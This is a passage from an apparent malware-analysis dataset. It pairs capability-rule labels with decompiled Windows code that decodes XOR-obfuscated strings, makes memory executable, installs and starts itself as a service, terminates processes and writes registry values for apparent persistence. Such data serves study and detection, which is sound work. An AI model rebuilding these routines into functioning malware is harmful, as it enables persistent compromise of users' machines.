  }\n    puVar4 = &var_34h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_4ch._0_1_ = 0x74;\n    var_4ch._1_1_ = 0x35;\n    var_4ch._2_1_ = 0x18;\n    var_4ch._3_1_ = 0x65;\n    var_48h = 0x34;\n    var_47h = 0x4b;\n    var_46h = 0x75;\n    var_45h = 0x35;\n    var_44h = 0x1d;\n    var_43h = 0x65;\n    var_42h = 0x30;\n    var_41h = 0x4b;\n    var_40h = 0xf;\n    var_3fh = 0x35;\n    var_3eh = 0x3b;\n    var_3dh = 0x65;\n    var_3ch = 8;\n    var_3bh = 0x4b;\n    var_3ah = 0x60;\n    var_39h = 0x35;\n    var_38h = 0x6c;\n    var_37h = 0x65;\n    var_24h._0_1_ = 0x38;\n    var_24h._1_1_ = 0x35;\n    var_24h._2_1_ = 0x6c;\n    var_24h._3_1_ = 0x65;\n    var_20h = 0x61;\n    var_1fh = 0x4b;\n    fcn.004012a0(0x2c);\n    for (var_4h = 0; var_4h < 0x16; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_4ch + var_4h) ^ *(&var_24h + var_4h % 6));\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x436508, 0x184, 0x40, &lpflOldProtect);\n    if (iVar3 != 0) {\n        fcn.004230a0(0x436508, 0x184);\n        (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x436508, 0x184, lpflOldProtect, &lpflOldProtect);\n    }\n    arg_ch = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, 0x343);\n    fcn.0041ea00(uVar2, arg_ch);\n    iVar3 = fcn.00401340(*0x436b48, &var_68h);\n    if (iVar3 != 0) {\n        if (2 < var_68h._1_1_) {\n            for (var_8h = 0; var_8h < var_68h._1_1_ - 2; var_8h = var_8h + 1) {\n                *0x436b98 = *0x436b98 + (&var_5ch)[var_8h];\n            }\n        }\n        *0x436b98 = *0x436b98 ^ 0x3dd5193;\n        fcn.00421090();\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    puVar4 = var_ch;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *var_ch = 0x20;\n    var_ch[1] = 1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401870, var_ch, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    do {\n        cVar1 = fcn.00414250(&var_2ch);\n        if ((cVar1 != '\\0') && (iVar3 = fcn.00401cb0(&var_2ch, &var_34h, 0),  iVar3 != 0)) {\n            var_1ch = 0;\n            var_18h = 0;\n            fcn.004245f0(&var_2ch);\n            uVar2 = fcn.00401270();\n            (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(uVar2);\n            fcn.004171d0(var_30h, 1, 1, &var_1ch, &var_18h);\n            (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(500);\n    } while( true );\n}\n",
        "token_count": 1547
    },
    "0040a170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a170(uint pszSrch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint8_t var_34h [4];\n    uchar var_30h;\n    uchar var_2fh;\n    int16_t *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int16_t *var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_28h = 0;\n    var_1ch = 0;\n    var_24h = 0;\n    iVar1 = fcn.0040adf0(pszSrch, &var_1ch, &var_24h);\n    if (iVar1 != 0) {\n        var_ch = (*_sym.imp.SHLWAPI.dll_StrDupW)(pszSrch);\n        var_20h = fcn.0041b350(var_ch, 0x2e);\n        if (var_20h != NULL) {\n            var_40h._0_1_ = 0x1f;\n            var_40h._1_1_ = 0x67;\n            var_40h._2_1_ = 0x5b;\n            var_40h._3_1_ = 0x4f;\n            var_3ch = 0x1b;\n            var_3bh = 0x4d;\n            var_3ah = 0x57;\n            var_39h = 0x67;\n            var_38h = 0x32;\n            var_37h = 0x4f;\n            var_34h[0] = 0x31;\n            var_34h[1] = 0x67;\n            var_34h[2] = 0x32;\n            var_34h[3] = 0x4f;\n            var_30h = 0x75;\n            var_2fh = 0x4d;\n            fcn.004012a0(0x14);\n            for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_40h + var_8h) ^ var_34h[var_8h % 6]);\n            }\n            var_14h = fcn.00401270();\n            var_10h = var_20h;\n            var_2ch = var_20h;\n            do {\n                var_2h._0_2_ = *var_14h;\n                *var_10h = var_2h;\n                var_14h = var_14h + 1;\n                var_10h = var_10h + 1;\n            } while (var_2h != 0);\n            fcn.004012d0();\n        }\n        iVar1 = fcn.00416790(var_ch, var_1ch, var_24h, 1);\n        if ((iVar1 == 0) && (iVar1 = fcn.0040a610(var_ch),  iVar1 != 0)) {\n            var_28h = 1;\n        }\n        if (var_ch != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return var_28h;\n}\n",
        "token_count": 931
    },
    "0040a320": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a35e)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a320(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uint8_t var_2ch [4];\n    uchar var_28h;\n    uchar var_27h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    if (*0x436b54 != 0) {\n        var_10h = 0;\n        var_14h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (var_4h != NULL) {\n            puVar3 = var_4h;\n            for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_48h._0_1_ = 0x69;\n            var_48h._1_1_ = 0x33;\n            var_48h._2_1_ = 0x3b;\n            var_48h._3_1_ = 0x6a;\n            var_44h = 0x12;\n            var_43h = 0x4a;\n            var_42h = 0x3f;\n            var_41h = 0x33;\n            var_40h = 0x1c;\n            var_3fh = 0x6a;\n            var_3eh = 0xe;\n            var_3dh = 0x4a;\n            var_3ch = 0x21;\n            var_3bh = 0x33;\n            var_3ah = 0x3a;\n            var_39h = 0x6a;\n            var_38h = 4;\n            var_37h = 0x4a;\n            var_36h = 0x23;\n            var_35h = 0x33;\n            var_34h = 0x1c;\n            var_33h = 0x6a;\n            var_32h = 0x4e;\n            var_31h = 0x4a;\n            var_30h = 0x10;\n            var_2fh = 0x33;\n            var_2eh = 0x68;\n            var_2dh = 0x6a;\n            var_2ch[0] = 0x4c;\n            var_2ch[1] = 0x33;\n            var_2ch[2] = 0x68;\n            var_2ch[3] = 0x6a;\n            var_28h = 0x6b;\n            var_27h = 0x4a;\n            fcn.004012a0(0x38);\n            for (var_8h = 0; var_8h < 0x1c; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_48h + var_8h) ^ var_2ch[var_8h % 6]);\n            }\n            uVar1 = fcn.00401270(var_4h, 0x104);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1);\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(var_4h, *0x436ba4);\n            iVar2 = fcn.004162b0(*0x436b44, &var_20h, &var_1ch);\n            if (iVar2 == 0) {\n                var_24h = 0;\n                iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(var_4h, *0x436b44);\n                if (iVar2 != 0) {\n                    var_24h = 1;\n                }\n                iVar2 = fcn.00416790(var_4h, var_20h, var_1ch, 1);\n                if ((iVar2 == 0) && (var_14h = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, 0, 0xf003f),  var_14h != 0)) {\n                    var_10h = (*_sym.imp.ADVAPI32.dll_CreateServiceW)\n                                        (var_14h, *0x436ba4, *0x436ba4, 0xf01ff, 0x10, 2, 1, var_4h, 0, 0, 0, 0, 0);\n                    if (var_10h != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_StartServiceW)(var_10h, 0, 0);\n                        if ((iVar2 != 0) && (var_24h != 0)) {\n                            for (var_ch = 0; var_ch < 0x40; var_ch = var_ch + 1) {\n                                (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(var_ch * 4 + 0x4369d8), 0);\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(var_ch * 4 + 0x4369d8));\n                            }\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x436c08);\n                            fcn.00423a50(0);\n                            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                        }\n                        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(var_10h);\n                    }\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(var_14h);\n                }\n            }\n            fcn.004012d0();\n        }\n        return 0;\n    }\n    do {\n        fcn.0040a170(*0x436b44);\n        (*_sym.imp.KERNEL32.dll_Sleep)(60000);\n    } while( true );\n}\n",
        "token_count": 1641
    },
    "0040a610": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a610(int16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint arg_10h;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    int16_t *var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    int16_t var_f8h;\n    int16_t var_f6h;\n    uint var_f4h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uint var_94h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uint8_t var_74h [4];\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uint var_60h;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uint8_t var_48h [4];\n    uchar var_44h;\n    uchar var_43h;\n    uint var_40h;\n    uchar var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    int16_t *var_20h;\n    int16_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hKey;\n    \n    hKey = 0;\n    var_114h = 1;\n    var_94h._0_1_ = 0x20;\n    var_94h._1_1_ = 0x45;\n    var_94h._2_1_ = 9;\n    var_94h._3_1_ = 0x78;\n    var_90h = 0x35;\n    var_8fh = 100;\n    var_8eh = 0x24;\n    var_8dh = 0x6c;\n    var_8ch = 0xd;\n    var_8bh = 0x53;\n    var_8ah = 8;\n    var_89h = 0x45;\n    var_88h = 0x18;\n    var_87h = 0x78;\n    var_86h = 0x1a;\n    var_85h = 100;\n    var_84h = 0x2b;\n    var_83h = 0x6c;\n    var_82h = 0xb;\n    var_81h = 0x53;\n    var_80h = 0x10;\n    var_7fh = 0x45;\n    var_7eh = 0xd;\n    var_7dh = 0x78;\n    var_7ch = 0x3f;\n    var_7bh = 100;\n    var_7ah = 0x29;\n    var_79h = 0x6c;\n    var_78h = 0x78;\n    var_77h = 0x53;\n    var_28h._0_1_ = 100;\n    var_28h._1_1_ = 0x45;\n    var_28h._2_1_ = 0x6c;\n    var_28h._3_1_ = 0x78;\n    var_24h = 0x53;\n    fcn.004012a0(0x3c);\n    for (var_8h = 0; var_8h < 0x1e; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_94h + var_8h) ^ *(&var_28h + var_8h % 5));\n    }\n    var_f4h._0_1_ = 0x1f;\n    var_f4h._1_1_ = 0x51;\n    var_f4h._2_1_ = 0x25;\n    var_f4h._3_1_ = 0x68;\n    var_f0h = 7;\n    var_efh = 0x4c;\n    var_eeh = 0x25;\n    var_edh = 0x4a;\n    var_ech = 0x1f;\n    var_ebh = 0x61;\n    var_eah = 0x2d;\n    var_e9h = 0x51;\n    var_e8h = 0x38;\n    var_e7h = 0x68;\n    var_e6h = 4;\n    var_e5h = 0x4c;\n    var_e4h = 0xd;\n    var_e3h = 0x4a;\n    var_e2h = 0x25;\n    var_e1h = 0x61;\n    var_e0h = 0x25;\n    var_dfh = 0x51;\n    var_deh = 0x29;\n    var_ddh = 0x68;\n    var_dch = 0x13;\n    var_dbh = 0x4c;\n    var_dah = 0x3e;\n    var_d9h = 0x4a;\n    var_d8h = 0x1b;\n    var_d7h = 0x61;\n    var_d6h = 0x23;\n    var_d5h = 0x51;\n    var_d4h = 0x2c;\n    var_d3h = 0x68;\n    var_d2h = 0x15;\n    var_d1h = 0x4c;\n    var_d0h = 0xd;\n    var_cfh = 0x4a;\n    var_ceh = 0x21;\n    var_cdh = 0x61;\n    var_cch = 9;\n    var_cbh = 0x51;\n    var_cah = 0xb;\n    var_c9h = 0x68;\n    var_c8h = 0x2a;\n    var_c7h = 0x4c;\n    var_c6h = 0xd;\n    var_c5h = 0x4a;\n    var_c4h = 0x2f;\n    var_c3h = 0x61;\n    var_c2h = 0x3e;\n    var_c1h = 0x51;\n    var_c0h = 0x25;\n    var_bfh = 0x68;\n    var_beh = 0x14;\n    var_bdh = 0x4c;\n    var_bch = 0x21;\n    var_bbh = 0x4a;\n    var_bah = 0x38;\n    var_b9h = 0x61;\n    var_b8h = 0x23;\n    var_b7h = 0x51;\n    var_b6h = 0x26;\n    var_b5h = 0x68;\n    var_b4h = 8;\n    var_b3h = 0x4c;\n    var_b2h = 0x32;\n    var_b1h = 0x4a;\n    var_b0h = 0x11;\n    var_afh = 0x61;\n    var_aeh = 0x10;\n    var_adh = 0x51;\n    var_ach = 0x1a;\n    var_abh = 0x68;\n    var_aah = 4;\n    var_a9h = 0x4c;\n    var_a8h = 0x3f;\n    var_a7h = 0x4a;\n    var_a6h = 0xc;\n    var_a5h = 0x61;\n    var_a4h = 0x25;\n    var_a3h = 0x51;\n    var_a2h = 0x24;\n    var_a1h = 0x68;\n    var_a0h = 6;\n    var_9fh = 0x4c;\n    var_9eh = 0x16;\n    var_9dh = 0x4a;\n    var_9ch = 0x38;\n    var_9bh = 0x61;\n    var_9ah = 3;\n    var_99h = 0x51;\n    var_98h = 0x39;\n    var_97h = 0x68;\n    var_96h = 0x61;\n    var_95h = 0x4c;\n    var_30h._0_1_ = 0x4c;\n    var_30h._1_1_ = 0x51;\n    var_30h._2_1_ = 0x4a;\n    var_30h._3_1_ = 0x68;\n    var_2ch = 0x61;\n    fcn.004012a0(0xc0);\n    for (var_ch = 0; var_ch < 0x60; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_f4h + var_ch) ^ *(&var_30h + var_ch % 5));\n    }\n    arg_10h = 0xf003f;\n    uVar1 = fcn.00401270();\n    hKey = fcn.00414010(0x80000001, uVar1, arg_10h);\n    if (hKey != 0) {\n        var_54h._0_1_ = 1;\n        var_54h._1_1_ = 0x67;\n        var_54h._2_1_ = 0x38;\n        var_54h._3_1_ = 0x46;\n        var_50h = 0x41;\n        var_4fh = 0x42;\n        var_4eh = 9;\n        var_4dh = 0x57;\n        var_4ch = 0x32;\n        var_4bh = 0x34;\n        var_4ah = 0x42;\n        var_49h = 0x67;\n        var_38h._0_1_ = 0x42;\n        var_38h._1_1_ = 0x67;\n        var_38h._2_1_ = 0x57;\n        var_38h._3_1_ = 0x46;\n        var_34h = 0x34;\n        fcn.004012a0(0x18);\n        for (var_10h = 0; var_10h < 0xc; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&var_54h + var_10h) ^ *(&var_38h + var_10h % 5));\n        }\n        var_60h._0_1_ = 0x39;\n        var_60h._1_1_ = 0x4d;\n        var_60h._2_1_ = 0x35;\n        var_60h._3_1_ = 0x48;\n        var_5ch = 0x19;\n        var_5bh = 0x69;\n        var_5ah = 0x25;\n        var_59h = 0x54;\n        var_58h = 0x79;\n        var_57h = 0x6d;\n        var_56h = 0x69;\n        var_55h = 0x4d;\n        var_40h._0_1_ = 0x69;\n        var_40h._1_1_ = 0x4d;\n        var_40h._2_1_ = 0x54;\n        var_40h._3_1_ = 0x48;\n        var_3ch = 0x6d;\n        fcn.004012a0(0x18);\n        for (var_14h = 0; var_14h < 0xc; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, *(&var_60h + var_14h) ^ *(&var_40h + var_14h % 5));\n        }\n        var_74h[0] = 0x24;\n        var_74h[1] = 0x6c;\n        var_74h[2] = 0x13;\n        var_74h[3] = 0x54;\n        var_70h = 0x54;\n        var_6fh = 0x4e;\n        var_6eh = 3;\n        var_6dh = 0x6c;\n        var_6ch = 0x1f;\n        var_6bh = 0x54;\n        var_6ah = 0x58;\n        var_69h = 0x4e;\n        var_68h = 0x19;\n        var_67h = 0x6c;\n        var_66h = 0x47;\n        var_65h = 0x54;\n        var_64h = 0x37;\n        var_63h = 0x4e;\n        var_48h[0] = 0x77;\n        var_48h[1] = 0x6c;\n        var_48h[2] = 0x76;\n        var_48h[3] = 0x54;\n        var_44h = 0x37;\n        var_43h = 0x4e;\n        fcn.004012a0(0x24);\n        for (var_18h = 0; var_18h < 0x12; var_18h = var_18h + 1) {\n            fcn.00401280(var_18h, var_74h[var_18h] ^ var_48h[var_18h % 6]);\n        }\n        var_110h = fcn.00401270();\n        uVar1 = fcn.00401270(0, 4, &var_114h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, uVar1);\n        var_1ch = arg_8h;\n        do {\n            var_f6h = *var_1ch;\n            var_1ch = var_1ch + 1;\n        } while (var_f6h != 0);\n        uVar1 = fcn.00401270(0, 1, arg_8h, (var_1ch - (arg_8h + 1) >> 1) << 1);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, uVar1);\n        var_20h = var_110h;\n        do {\n            var_f8h = *var_20h;\n            var_20h = var_20h + 1;\n        } while (var_f8h != 0);\n        uVar1 = fcn.00401270(0, 1, var_110h, (var_20h - (var_110h + 1) >> 1) << 1);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, uVar1);\n        fcn.00414090(hKey);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    fcn.004012d0();\n    fcn.004012d0();\n    return 1;\n}\n",
        "token_count": 4531
    },
    "0040adf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040adf0(int16_t *arg_8h, char **arg_ch, int32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint arg_ch_00;\n    int32_t arg_10h_00;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    char *var_180h;\n    uint ARG_0;\n    uint var_178h;\n    uint var_16ch;\n    uchar var_168h;\n    uchar var_167h;\n    uchar var_166h;\n    uchar var_165h;\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uchar var_161h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uchar var_141h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uchar var_12bh;\n    uchar var_12ah;\n    uchar var_129h;\n    uchar var_128h;\n    uchar var_127h;\n    uchar var_126h;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar 